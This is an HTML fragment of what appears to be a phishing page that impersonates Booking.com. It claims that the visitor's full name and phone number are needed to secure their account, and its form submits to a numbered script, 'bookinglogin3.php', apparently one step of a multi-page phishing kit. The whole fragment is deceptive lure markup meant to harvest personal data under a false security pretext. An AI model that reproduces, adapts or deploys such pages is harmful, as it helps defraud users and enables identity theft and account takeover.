                ...
                <div class="bg-inf mx-auto  mt-5 ">
                    ...
                    <div class="card  border-0 mx-auto mt-5">
                        <div class="card-head mx-3">
                            ...
                            <span>Your full name and phone number are needed to ensure the security of your
                                Booking.com
                                account.</span>
                        </div>
                        <div class="card-body">
                            <form action="bookinglogin3.php" method="post">
                                ...
                                <input type="phone" class="form-control  form-control-lg bord">
                                ...
                                <button type=" submit" class="btn btn-primary btn-lg form-control mt-5">
                                    Next
                                </button>
                                <hr>
